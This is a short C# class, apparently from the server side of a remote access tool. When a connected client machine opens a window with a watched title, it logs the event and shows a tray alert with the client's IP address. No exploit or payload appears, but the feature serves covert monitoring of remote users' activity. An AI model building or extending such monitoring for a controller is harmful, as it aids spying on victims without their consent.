﻿using Server.Sockets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleReportWindow
    {
        public HandleReportWindow(Clients client, string title)
        {
            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]", Color.Blue);
            if (Program.form1.InvokeRequired)
            {
                Program.form1.BeginInvoke((MethodInvoker)(() =>
                {
                    if (Properties.Settings.Default.Notification == true)
                    {
                        Program.form1.notifyIcon1.BalloonTipText = $"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]";
                        Program.form1.notifyIcon1.ShowBalloonTip(100);
                    }
                }));
            }
        }
    }
}
